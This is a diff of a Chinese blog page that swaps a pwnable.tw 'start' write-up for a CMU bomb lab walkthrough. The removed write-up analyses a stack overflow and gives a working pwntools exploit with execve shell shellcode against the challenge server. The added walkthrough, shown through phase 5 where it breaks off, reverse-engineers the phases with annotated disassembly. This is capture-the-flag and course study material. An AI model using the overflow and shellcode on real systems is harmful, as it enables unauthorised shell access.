@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>pwnable.tw-start | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" 汇编 , shellcode ">
-  <meta name="description" content="pwnable.tw-start | sixpar&#39;s blog">
+  <title>天问计划week9-day6 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 天问计划 ">
+  <meta name="description" content="天问计划week9-day6 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -692,9 +692,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-pwnable-tw-start" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-天问计划week9-day6" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">pwnable.tw-start</h1>
+        <h1 class="article-title">天问计划week9-day6</h1>
     
     <div class="article-meta">
         
@@ -704,7 +704,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="系列">系列</a>
             
         </span>
         
@@ -712,21 +712,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">汇编</a>
-            
-            <a class="color5">shellcode</a>
+            <a class="color5">天问计划</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-09 00:08:51'>2020-07-09 00:08</time>
+            Created At : <time class="date" title='Updated At: 2020-07-25 22:17:59'>2020-07-25 10:41</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.1k</span>
+        <span>Count:4.6k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -756,7 +754,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用分析："><span class="toc-text">漏洞利用分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bomb-lab："><span class="toc-text">bomb lab：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前排提示："><span class="toc-text">前排提示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-phase-1"><span class="toc-text">1.phase_1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-phase-2"><span class="toc-text">2.phase_2:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-phase-3"><span class="toc-text">3.phase_3:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-phase-4："><span class="toc-text">4.phase_4：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-phase-5："><span class="toc-text">5.phase_5：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-phase-6："><span class="toc-text">6.phase_6：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#今日总结："><span class="toc-text">今日总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -772,66 +770,297 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><blockquote>
-<p>Arch:     i386-32-little<br>RELRO:    No RELRO<br>Stack:    No canary found<br>NX:       NX disabled<br>PIE:      No PIE (0x8048000)</p>
+        <h2 id="bomb-lab："><a href="#bomb-lab：" class="headerlink" title="bomb lab："></a>bomb lab：</h2><h3 id="前排提示："><a href="#前排提示：" class="headerlink" title="前排提示："></a>前排提示：</h3><ol>
+<li><p>可以新建一个名为string.txt 的文件 ，然后把之前解出来的答案写到里面，每个答案一行，然后在gdb调试时设置如下命令行参数：<br>set args string.txt</p>
+<p>即可直接输入已经解出的答案，避免每次都重新从头输入，那么繁琐。</p>
+</li>
+<li><p>使用tmux虽然方便，但是发现并不能滚动滚轮上下文查看。所以这样设置：</p>
+<p>运行tmux后，按Ctrl+b 之后，输入冒号进入命令行模式，然后输入：</p>
+<p>set -g mouse on</p>
+<p>即可使用滚轮 </p>
+</li>
+</ol>
+<h3 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1.phase_1:"></a>1.phase_1:</h3><p>关于昨天做的phase_1，除了在gdb里输入：”x/s 0x402400” 或者 “p (char*)(0x402400)” 之外，</p>
+<p>我发现在IDA里可以直接找到string ：“Border relations with Canada have never been better.” </p>
+<p>IDA会把字符串指针的值直接显示出来了。</p>
+<p>还有，第一次觉得IDA里那个流程图好有用哦。jz跳转啥的都能一目了然</p>
+<p>如果不适应AT&amp;T的，可以调为Intel格式的： objdump -M intel -d bomb</p>
+<h3 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2.phase_2:"></a>2.phase_2:</h3><p>接下来做phase_2：</p>
+<p>我用的是Intel格式的： objdump -M intel -d bomb</p>
+<p>得到phase_2的汇编代码段：</p>
+<pre><code class="c">0000000000400efc &lt;phase_2&gt;:
+  400efc:    55                       push   rbp
+  400efd:    53                       push   rbx
+  400efe:    48 83 ec 28              sub    rsp,0x28
+  400f02:    48 89 e6                 mov    rsi,rsp
+  400f05:    e8 52 05 00 00           call   40145c &lt;read_six_numbers&gt; //读入6个数，且第一个数将存在rsp处
+  400f0a:    83 3c 24 01              cmp    DWORD PTR [rsp],0x1   //第一个数和1进行比较
+  400f0e:    74 20                    je     400f30 &lt;phase_2+0x34&gt;  //相等就跳转到400f30，这里必须相等，要不然就会执行到explore爆炸函数，即第一个数必须为1
+  400f10:    e8 25 05 00 00           call   40143a &lt;explode_bomb&gt;  //爆炸
+  400f15:    eb 19                    jmp    400f30 &lt;phase_2+0x34&gt;  //这句好像没意义？
+  400f17:    8b 43 fc                 mov    eax,DWORD PTR [rbx-0x4] //把rbx-0x4的值给eax
+  400f1a:    01 c0                    add    eax,eax   // 2*eax
+  400f1c:    39 03                    cmp    DWORD PTR [rbx],eax  //比较rbx和2*(rbx-0x4)的值
+  400f1e:    74 05                    je     400f25 &lt;phase_2+0x29&gt;  //相等就跳转到400f25
+  400f20:    e8 15 05 00 00           call   40143a &lt;explode_bomb&gt;  //爆炸
+  400f25:    48 83 c3 04              add    rbx,0x4  // rbx+0x4
+  400f29:    48 39 eb                 cmp    rbx,rbp  // rbx与rbp进行比较
+  400f2c:    75 e9                    jne    400f17 &lt;phase_2+0x1b&gt; //如果rbx和rbp不相等就跳回400f17处继续循环
+  400f2e:    eb 0c                    jmp    400f3c &lt;phase_2+0x40&gt; //跳到phase_2函数末尾
+  400f30:    48 8d 5c 24 04           lea    rbx,[rsp+0x4]   //加载 rsp+0x4处的值给rbx
+  400f35:    48 8d 6c 24 18           lea    rbp,[rsp+0x18] //加载 rsp+0x18处的值给rbp
+  400f3a:    eb db                    jmp    400f17 &lt;phase_2+0x1b&gt;
+  400f3c:    48 83 c4 28              add    rsp,0x28
+  400f40:    5b                       pop    rbx
+  400f41:    5d                       pop    rbp
+  400f42:    c3                       ret    
+</code></pre>
+<p>根据以上我已经大致了解了程序的运行原理。</p>
+<p>首先会call调用 read_six_numbers函数，读取6个数字，且最后返回的时候 rsp 的位置存着第1个数字的地址。然后后面的数字依次存入 rsp+0x4 ，rsp+0x8，rsp+0xC , rsp+0x10 , rsp+0x14 中</p>
+<p>然后第一个数必须是1，要不然会引爆炸弹。</p>
+<p>然后跳转到 0x400f30处， 把 rsp+0x4 处的值给rbx，把 rsp+0x18 处的值给rbp</p>
+<p>ok，现在rbx里存的是第2个数字， rbp存的是第6个数字之后+4的地址。</p>
+<p>然后跳转回0x400f17开始执行核心代码了：</p>
+<p>把rbx-0x4 赋给eax，eax=(rsp+0x4 )-0x4 ，所以现在eax 中存的是 第1个数字。</p>
+<p>add eax,eax  ，即eax=eax*2</p>
+<p>然后比较eax和rbx。就是比较 rsp与 rsp+0x4 ，即第1个数字和第2个数字</p>
+<p>也就是说<code>第2个数字将会是第1个数字的2倍</code>。ok，找到关键点了。</p>
+<p>绕过爆炸函数后接着把 rbx+0x4，即 (rsp+0x4)+0x4= rsp+0x8 ，开始轮到第3个数字了。</p>
+<p>然后比较 rbx和rbp 。rbx肯定还没到达rbp的地址，所以返回0x400f17处继续循环。</p>
+<p>所以根据以上，就可以大致猜出，第1个数字是1，且后一个数字是前一个数字的两倍。</p>
+<p>所以最后得到这6个数字为 ： 1 , 2 , 4 , 8 , 16 , 32</p>
+<h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3.phase_3:"></a>3.phase_3:</h2><p>知识点：jb 和 ja 用无符号整数的比较。指令 ja 表示 CF=0 且ZF=0 即A&gt;B转移； 指令 jb 表示 CF=1 且ZF=0 即A &lt;B转移；</p>
+<p>而 jg 则表示 带符号整数的大小比较。 jg则表示大于关系跳转。</p>
+<pre><code class="c">0000000000400f43 &lt;phase_3&gt;:
+  400f43:    48 83 ec 18              sub    rsp,0x18
+  400f47:    48 8d 4c 24 0c           lea    rcx,[rsp+0xc]
+  400f4c:    48 8d 54 24 08           lea    rdx,[rsp+0x8]
+  400f51:    be cf 25 40 00           mov    esi,0x4025cf  //字符串常量0x4025cf存入esi
+  400f56:    b8 00 00 00 00           mov    eax,0x0
+  400f5b:    e8 90 fc ff ff           call   400bf0 &lt;__isoc99_sscanf@plt&gt;
+  400f60:    83 f8 01                 cmp    eax,0x1   //eax必须大于1
+  400f63:    7f 05                    jg     400f6a &lt;phase_3+0x27&gt;
+  400f65:    e8 d0 04 00 00           call   40143a &lt;explode_bomb&gt;
+  400f6a:    83 7c 24 08 07           cmp    DWORD PTR [rsp+0x8],0x7  //rsp+0x8处的值必须小于等于7
+  400f6f:    77 3c                    ja     400fad &lt;phase_3+0x6a&gt; //大于7则爆炸
+  400f71:    8b 44 24 08              mov    eax,DWORD PTR [rsp+0x8] //eax=rsp+0x8处的值
+  400f75:    ff 24 c5 70 24 40 00     jmp    QWORD PTR [rax*8+0x402470] //switch跳转
+  400f7c:    b8 cf 00 00 00           mov    eax,0xcf 
+  400f81:    eb 3b                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400f83:    b8 c3 02 00 00           mov    eax,0x2c3
+  400f88:    eb 34                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400f8a:    b8 00 01 00 00           mov    eax,0x100
+  400f8f:    eb 2d                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400f91:    b8 85 01 00 00           mov    eax,0x185
+  400f96:    eb 26                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400f98:    b8 ce 00 00 00           mov    eax,0xce
+  400f9d:    eb 1f                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400f9f:    b8 aa 02 00 00           mov    eax,0x2aa 
+  400fa4:    eb 18                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400fa6:    b8 47 01 00 00           mov    eax,0x147 
+  400fab:    eb 11                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400fad:    e8 88 04 00 00           call   40143a &lt;explode_bomb&gt;
+  400fb2:    b8 00 00 00 00           mov    eax,0x0
+  400fb7:    eb 05                    jmp    400fbe &lt;phase_3+0x7b&gt;
+  400fb9:    b8 37 01 00 00           mov    eax,0x137
+  400fbe:    3b 44 24 0c              cmp    eax,DWORD PTR [rsp+0xc]
+  400fc2:    74 05                    je     400fc9 &lt;phase_3+0x86&gt;
+  400fc4:    e8 71 04 00 00           call   40143a &lt;explode_bomb&gt;
+  400fc9:    48 83 c4 18              add    rsp,0x18
+  400fcd:    c3                       ret</code></pre>
+<p>看到了调用了 sscanf，所以这个函数前面一定会有一个字符串常量存储需要读取的数据格式，所以字符串常量一定是 0x4025cf ，用gdb打印出来确定格式： </p>
+<blockquote>
+<p>gdb-peda$ p (char*)(0x4025cf)<br>$1 = 0x4025cf “%d %d”</p>
 </blockquote>
-<h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>通篇只有start函数和exit函数，而且都是以汇编的形式。<br>主程序如下：</p>
-<pre><code class="c">.text:08048060                 push    esp
-.text:08048061                 push    offset _exit
-.text:08048066                 xor     eax, eax
-.text:08048068                 xor     ebx, ebx
-.text:0804806A                 xor     ecx, ecx
-.text:0804806C                 xor     edx, edx
-.text:0804806E                 push    3A465443h
-.text:08048073                 push    20656874h
-.text:08048078                 push    20747261h
-.text:0804807D                 push    74732073h
-.text:08048082                 push    2774654Ch
-.text:08048087                 mov     ecx, esp        ; addr
-.text:08048089                 mov     dl, 14h         ; len
-.text:0804808B                 mov     bl, 1           ; fd
-.text:0804808D                 mov     al, 4
-.text:0804808F                 int     80h             ; LINUX - sys_write
-.text:08048091                 xor     ebx, ebx
-.text:08048093                 mov     dl, 3Ch
-.text:08048095                 mov     al, 3
-.text:08048097                 int     80h             ; LINUX -
-.text:08048099                 add     esp, 14h
-.text:0804809C                 retn</code></pre>
-<p>下面来详细分析：<br>首先060（简写，即0x08048060，下同）处push esp，将当前esp的地址压入栈。<br>然后061处把exit函数的返回地址压入栈中。<br>066-06c清空寄存器。因为寄存器等会要拿来传参。<br>然后06e-082处push一堆字符串入栈（总共0x14字节）。字符串转为ascall码是“Let’s start the CTF:”<br>087-08f这段：eax为4表明系统调用号为4号即write函数。把寄存器ecx指向之前push进栈的字符串，所以很明显是要打印刚刚的字符串咯。等一切参数设置好以后，int 80h 来system_call系统调用。<br>091-097这一段：xor清空ebx，令eax=3即read函数，edx=0x3c，表明要往栈中read读取 0x3c （60）个字节。<br>接下来099处的 add esp,14h  表明回收栈帧，清理栈空间。<br>09c是retn返回地址。</p>
-<h2 id="漏洞利用分析："><a href="#漏洞利用分析：" class="headerlink" title="漏洞利用分析："></a>漏洞利用分析：</h2><p>首先程序把esp地址存入了栈中，这就是在提示我们可以去泄露它。并且本题没有开启ASLR和PIE。可以泄露。</p>
-<p>其次是write这里，write既然提供打印功能，那我们也就要认识到，可不可以稍微做一点修改，能让write打印出上面的esp的地址呢。  </p>
-<p>再然后就是read函数这里很明显存在着溢出点。栈大小估计是只有0x14大小，而现在可以读取0x3c字节，妥妥溢出。</p>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>当程序段末尾回收掉 0x14 字节栈帧后，最高地址就是exit函数的地址（返回地址），我们可以把返回地址覆盖为 0x8048087（mov ecx,esp 指令，位于write系统调用程序片段首部），于是retn时便可将控制流劫持到mov ecx,esp后，并且栈中esp的地址自动+4，此时栈顶esp存放的正好是本程序第一个语句push 进来的esp的地址。程序流被修改了，故下一条语句是mov ecx,esp，即将write的参数ecx的值指向栈顶。于是借用write系统调用，我们便能把一开始push入栈的esp的地址给泄露出来了。</p>
-<p>由于程序流被劫持，重新来到了write函数片段处执行，而代码顺序从上到下执行，所以又要调用read，我们又有一次输入的机会。</p>
-<p>这一次我们布置shellcode，利用泄露出来的栈地址，我们知道了栈地址，便可把shellcode布置到栈上，然后劫持程序流跳到shellcode并执行。<br>所以我们可以直接在第二次read系统调用中溢出将shellcode部分写在esp+0x14的栈内存中，并用这个地址覆盖返回地址，因为第二次还会有add esp，14h这条指令，所以实际覆盖点还要调高0x14个字节。<br>所以最终我们覆盖返回地址为 esp+0x14。然后返回地址之后跟上我们的shellcode，随后便会跳转到我们的shellcode处并执行</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><pre><code class="python">#!/usr/bin/env python2
-# -*- coding: utf-8 -*-
-from pwn import  *
-io = remote(&#39;chall.pwnable.tw&#39;,10000)
-# io =process(&#39;./start&#39;)
-#shellcode
-shellcode=&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;
-log.success(&#39;len(shellcode) = &#39; + hex(len(shellcode)))
-
-#leak esp
-payload = &#39;a&#39;*0x14 + p32(0x08048087)  # 硬编码覆盖返回地址为 mov ecx, esp 指令所在地址
-# retn to write
-# write打印的参数是ecx，而ecx=esp地址。
-io.recv()
-io.send(payload)
-
-esp=u32(io.recv()[:4])
-log.success(&#39;esp = &#39; + hex(esp))
-stack = esp + 0x14  
-log.success(&#39;target addr = &#39; + hex(stack))  
-
-#get shell
-payload = &#39;a&#39;*0x14 + p32(stack) + shellcode
-io.send(payload)
-
-io.interactive()</code></pre>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>本题要求能看懂汇编代码。并且要搞清楚esp的运作。</p>
+<p>我靠，学到了。 一个字符串常量来存储需要的数据格式。</p>
+<p>可以看到数据格式”%d %d”，故需要输入两个整数。而 eax存储的是scanf函数的返回值。</p>
+<p>由开头的语句得知：</p>
+<blockquote>
+<p>lea    rcx,[rsp+0xc]</p>
+<p>lea    rdx,[rsp+0x8]</p>
+</blockquote>
+<p>所以知道了第1个数存在rsp+0x8处，第2个数存在rsp+0xc处。</p>
+<p>代码段的后半段有很多的jmp，且都是通过0x400f75处的处理结果来判断跳转的，所以推测0x400f75处是switch语句。</p>
+<p>0x400f75处的语句是根据  rax*8+0x402470  的结果跳转的。 而rax就是我们输入的第一个数。</p>
+<p>查看 “基址”：0x402470：</p>
+<pre><code class="c">gdb-peda$ x/10xg 0x402470
+0x402470:    0x0000000000400f7c    0x0000000000400fb9
+0x402480:    0x0000000000400f83    0x0000000000400f8a
+0x402490:    0x0000000000400f91    0x0000000000400f98
+0x4024a0:    0x0000000000400f9f    0x0000000000400fa6</code></pre>
+<p>可以发现，若eax=1时，会跳转到 [0x402470+1*8]= [0x402478] = 0x400fb9 ，即跳转到对应的case语句。</p>
+<p>而每一个case语句一开始都会将某个参数赋给eax，然后统一跳转到 0x400fbe 处。而在这个地方则是将我们输入的第二个数和每个case传给eax中不同的值进行比较，相等就跳过炸弹否则爆炸。</p>
+<p>而刚才分析了eax的值是根据第一个值跳转到不同的case得到的。那么有多少个case就应该有多少个解题的答案，我们只需要确定第一个数然后顺着跳转到其中一个case中，然后看这个case中的常量值是多少即为我们输入的第二个值了。</p>
+<p>所以根据之前分析的，我第一个数输入1，然后顺着跳转来到了0x400fb9处，找到了第二个数为0x137，即十进制的311</p>
+<p>所以最后我只要输入  1 , 311 即可通过本关。（当然，本题还有其他的选择，eax取0,1,2,3,4,5,6都可）</p>
+<h2 id="4-phase-4："><a href="#4-phase-4：" class="headerlink" title="4.phase_4："></a>4.phase_4：</h2><p>jbe指令：（无符号整数）低于(below)或等于(equal)则跳转</p>
+<p>jle指令：（有符号整数）小于(less)或等于(equal)则跳转</p>
+<p>jge指令：（有符号整数）大于(large)或等于(equal)则跳转</p>
+<p>根据x86汇编的约定， rdi，rsi，rdx 分别存储第1,2,3个参数，rax存储函数的返回值</p>
+<pre><code class="c">000000000040100c &lt;phase_4&gt;:
+  40100c:    48 83 ec 18              sub    rsp,0x18
+  401010:    48 8d 4c 24 0c           lea    rcx,[rsp+0xc]
+  401015:    48 8d 54 24 08           lea    rdx,[rsp+0x8]
+  40101a:    be cf 25 40 00           mov    esi,0x4025cf
+  40101f:    b8 00 00 00 00           mov    eax,0x0
+  401024:    e8 c7 fb ff ff           call   400bf0 &lt;__isoc99_sscanf@plt&gt;
+  401029:    83 f8 02                 cmp    eax,0x2
+  40102c:    75 07                    jne    401035 &lt;phase_4+0x29&gt;
+  40102e:    83 7c 24 08 0e           cmp    DWORD PTR [rsp+0x8],0xe //第一个数必须小于等于0xe
+  401033:    76 05                    jbe    40103a &lt;phase_4+0x2e&gt;
+  401035:    e8 00 04 00 00           call   40143a &lt;explode_bomb&gt;
+  40103a:    ba 0e 00 00 00           mov    edx,0xe  //edx=0xe
+  40103f:    be 00 00 00 00           mov    esi,0x0 //esi=0x0
+  401044:    8b 7c 24 08              mov    edi,DWORD PTR [rsp+0x8]  //edi=第1个数
+  401048:    e8 81 ff ff ff           call   400fce &lt;func4&gt;  //调用 fun_4函数
+  40104d:    85 c0                    test   eax,eax  //测试返回值是否为0，否则爆炸
+  40104f:    75 07                    jne    401058 &lt;phase_4+0x4c&gt;
+  401051:    83 7c 24 0c 00           cmp    DWORD PTR [rsp+0xc],0x0 //判断第2个数是否为0
+  401056:    74 05                    je     40105d &lt;phase_4+0x51&gt; //所以第2个数必须为0
+  401058:    e8 dd 03 00 00           call   40143a &lt;explode_bomb&gt;
+  40105d:    48 83 c4 18              add    rsp,0x18
+  401061:    c3                       ret    
+</code></pre>
+<p>本题前面的代码和phase_3差不多。也是调用scanf函数，然后输入两个数字存起来，rsp+0x8 和 rsp+0xC。</p>
+<p>不同的是本题调用了 fun_4 函数。</p>
+<pre><code class="c">0000000000400fce &lt;func4&gt;:
+  400fce:    48 83 ec 08              sub    rsp,0x8 //分配栈帧
+  400fd2:    89 d0                    mov    eax,edx  // eax=edx=0xe
+  400fd4:    29 f0                    sub    eax,esi  // eax=0xe-0x0=0xe ??不变
+  400fd6:    89 c1                    mov    ecx,eax  //ecx=eax=0xe
+  400fd8:    c1 e9 1f                 shr    ecx,0x1f //ecx右移31位，取ecx的符号位?所以ecx为0咯
+  400fdb:    01 c8                    add    eax,ecx  //eax=0xe+0x0=0xe ??又不变，迷惑行为
+  400fdd:    d1 f8                    sar    eax,1 //右移1位，相当于除2 ，即 eax=(eax/2)=7
+  400fdf:    8d 0c 30                 lea    ecx,[rax+rsi*1]  //ecx=0x7+0x0=0x7
+  400fe2:    39 f9                    cmp    ecx,edi  //edi是第1个数，即比较0x7是否小于等于第1个数 
+  400fe4:    7e 0c                    jle    400ff2 &lt;func4+0x24&gt; //第1个数大于等于0x7则跳转到0x400ff2
+  400fe6:    8d 51 ff                 lea    edx,[rcx-0x1] // edx=0x7-0x1=0x6
+  400fe9:    e8 e0 ff ff ff           call   400fce &lt;func4&gt; //递归调用
+  400fee:    01 c0                    add    eax,eax  //递归返回值加倍
+  400ff0:    eb 15                    jmp    401007 &lt;func4+0x39&gt; //跳转到fun_4函数末尾
+  400ff2:    b8 00 00 00 00           mov    eax,0x0  //eax=0
+  400ff7:    39 f9                    cmp    ecx,edi  //又比较一遍，第1个数是否小于等于0x7
+  400ff9:    7d 0c                    jge    401007 &lt;func4+0x39&gt; //第1个数小于等于0x7则跳转至函数末尾，结束函数
+  400ffb:    8d 71 01                 lea    esi,[rcx+0x1]
+  400ffe:    e8 cb ff ff ff           call   400fce &lt;func4&gt;  //递归调用
+  401003:    8d 44 00 01              lea    eax,[rax+rax*1+0x1] //递归返回值加倍加1
+  401007:    48 83 c4 08              add    rsp,0x8 //清空栈帧
+  40100b:    c3                       ret    //返回函数</code></pre>
+<p>在fun_4的函数体中发现它又有调用自身，于是想到了这里用的是递归。</p>
+<p>关于本题的调试手法：</p>
+<p>set args string.txt    把答案集作为参数传入，自动输入。</p>
+<p>然后 b *0x401048  在调用fun_4处下断点。</p>
+<p>输入r开始运行，前面三个phase自动输入答案跳过，然后在第4个phase处输入 3 0 ，然后程序自动截断，断在了0x401048处。</p>
+<p>此时 rdi是我们输入的第1个数0x3，rsi=0x0，rdx=0xe</p>
+<p>然后 si 步入fun_4函数。</p>
+<p>运行几步后ecx=0x7，然后就把ecx和edi(我们输入的第1个数)进行比较。</p>
+<p>比较结果：我们输入的3比7小，所以不跳转，继续顺序往下执行，只见把edx的值减1后继续调用fun_4函数。</p>
+<p>所以这里我们如果令输入的第1个数为7，会怎样？</p>
+<p>重新来一遍，这一回输入 7 0，然后第一遍比较的时候由于 符合“第1个数大于等于0x7”所以跳转到 0x400ff2，</p>
+<p>而0x400ff2处的代码将检查 是否符合“第1个数小于等于0x7”。</p>
+<p>哈哈，这回明白了，要想同时符合这两个条件，第1个数就只能为 7 了 。</p>
+<p>又由于fun_4函数返回时有一个判断，第2个数必须等于0才不会引爆炸弹。</p>
+<p>所以综上，得到本题的答案： 7 0</p>
+<p>另外附上某位师傅逆向出的fun_4的C源程序：（我是没能力逆向出源程序的，只是大致了解程序的功能，wtcl）</p>
+<pre><code class="c">int func4(int target, int step, int limit) {
+  /*由调用约定得： edi = target; esi = step; edx = limit */
+  int temp = (limit - step) * 0.5;  //右移1位，即除以2
+  int mid = temp + step;
+  if (mid &gt; target) {
+    limit = mid - 1;
+    int ret1 = func4(target, step, limit);
+    return 2 * ret1;
+  } else {
+    if (mid &gt;= target) {
+      return 0;
+    } else {
+      step = mid + 1;
+      int ret2 = func4(target, step, limit);
+      return (2 * ret2 + 1);
+    }
+  }
+}</code></pre>
+<h2 id="5-phase-5："><a href="#5-phase-5：" class="headerlink" title="5.phase_5："></a>5.phase_5：</h2><p>同样先贴上汇编代码进行分析：</p>
+<p>本题我输入了 “123456”作为测试数据。</p>
+<pre><code class="c">0000000000401062 &lt;phase_5&gt;:
+  401062:    53                       push   rbx
+  401063:    48 83 ec 20              sub    rsp,0x20
+  401067:    48 89 fb                 mov    rbx,rdi
+  40106a:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  //canary保护
+  401071:    00 00 
+  401073:    48 89 44 24 18           mov    QWORD PTR [rsp+0x18],rax
+  401078:    31 c0                    xor    eax,eax
+  40107a:    e8 9c 02 00 00           call   40131b &lt;string_length&gt;
+  40107f:    83 f8 06                 cmp    eax,0x6   //要求输入的字符串长度为6，否则爆炸
+  401082:    74 4e                    je     4010d2 &lt;phase_5+0x70&gt;
+  401084:    e8 b1 03 00 00           call   40143a &lt;explode_bomb&gt;
+  401089:    eb 47                    jmp    4010d2 &lt;phase_5+0x70&gt;
+  40108b:    0f b6 0c 03              movzx  ecx,BYTE PTR [rbx+rax*1] //取rbx处地址的1字节，然后0拓展为32位，然后存到ecx里，果然ecx变为了 0x31 (&#39;1&#39;)
+  40108f:    88 0c 24                 mov    BYTE PTR [rsp],cl //此刻[rsp]值的低1字节从&quot;0x10&quot;变为了&quot;0x31&quot; ，即变为了 0x402231 ，能理解
+  401092:    48 8b 14 24              mov    rdx,QWORD PTR [rsp] // rdx=[rsp]=0x402231
+  401096:    83 e2 0f                 and    edx,0xf //掩码，把edx的高28位清零，只剩余低4位。所以edx变为了0x1
+  401099:    0f b6 92 b0 24 40 00     movzx  edx,BYTE PTR [rdx+0x4024b0] //以我们给出的低4位的值作为索引，取出程序中固定的一长串字符串里的某个字符，然后存储到edx里。比如我们这里取出的是[0x4024b1]=0x61=&quot;a&quot;。
+  4010a0:    88 54 04 10              mov    BYTE PTR [rsp+rax*1+0x10],dl //用edx的低1字节覆盖[rsp+0x0+0x10]的低1字节
+  4010a4:    48 83 c0 01              add    rax,0x1 //rax=0x0+0x1=0x1
+  4010a8:    48 83 f8 06              cmp    rax,0x6 //不满6次，继续循环
+  4010ac:    75 dd                    jne    40108b &lt;phase_5+0x29&gt;
+  4010ae:    c6 44 24 16 00           mov    BYTE PTR [rsp+0x16],0x0 //[rsp+0x16]=0x0
+  4010b3:    be 5e 24 40 00           mov    esi,0x40245e  //esi=0x40245e 这个地址存储了字符串&quot;flyers&quot; ,懂了，肯定是要让我们从那一长串固定字符串里寻找出这6个字符。
+  4010b8:    48 8d 7c 24 10           lea    rdi,[rsp+0x10] //rdi=[rsp+0x10]
+  4010bd:    e8 76 02 00 00           call   401338 &lt;strings_not_equal&gt; //字符比较。
+  4010c2:    85 c0                    test   eax,eax
+  4010c4:    74 13                    je     4010d9 &lt;phase_5+0x77&gt;
+  4010c6:    e8 6f 03 00 00           call   40143a &lt;explode_bomb&gt;
+  4010cb:    0f 1f 44 00 00           nop    DWORD PTR [rax+rax*1+0x0]
+  4010d0:    eb 07                    jmp    4010d9 &lt;phase_5+0x77&gt;
+  4010d2:    b8 00 00 00 00           mov    eax,0x0
+  4010d7:    eb b2                    jmp    40108b &lt;phase_5+0x29&gt;
+  4010d9:    48 8b 44 24 18           mov    rax,QWORD PTR [rsp+0x18]
+  4010de:    64 48 33 04 25 28 00     xor    rax,QWORD PTR fs:0x28
+  4010e5:    00 00 
+  4010e7:    74 05                    je     4010ee &lt;phase_5+0x8c&gt;
+  4010e9:    e8 42 fa ff ff           call   400b30 &lt;__stack_chk_fail@plt&gt;
+  4010ee:    48 83 c4 20              add    rsp,0x20
+  4010f2:    5b                       pop    rbx
+  4010f3:    c3                       ret    
+</code></pre>
+<p>调试：</p>
+<p>输入”123456”，然后断在 0x40107a 即call string_length处。</p>
+<p>此时 rdi，rsi，rbx均指向存储字符串“123456”的地址 0x6038c0。</p>
+<p>步入，进入string_length函数：(以下的根据我输入的“123456”来解释)</p>
+<pre><code class="c">   0x000000000040131b &lt;+0&gt;:    cmp    BYTE PTR [rdi],0x0
+   0x000000000040131e &lt;+3&gt;:    je     0x401332 &lt;string_length+23&gt;
+   0x0000000000401320 &lt;+5&gt;:    mov    rdx,rdi // rdx=rdi=0x6038C0 -&gt;0x363534333231(&#39;123456&#39;)
+   0x0000000000401323 &lt;+8&gt;:    add    rdx,0x1 // rdx=0x6038C1 -&gt; 0x3635343332(&#39;23456&#39;)
+   0x0000000000401327 &lt;+12&gt;:    mov    eax,edx //eax=edx=0x6038C1
+   0x0000000000401329 &lt;+14&gt;:    sub    eax,edi //eax=0x6038C1-0x6038C0=0x1
+   0x000000000040132b &lt;+16&gt;:    cmp    BYTE PTR [rdx],0x0 //rdx还未清空为0x0，还有23456
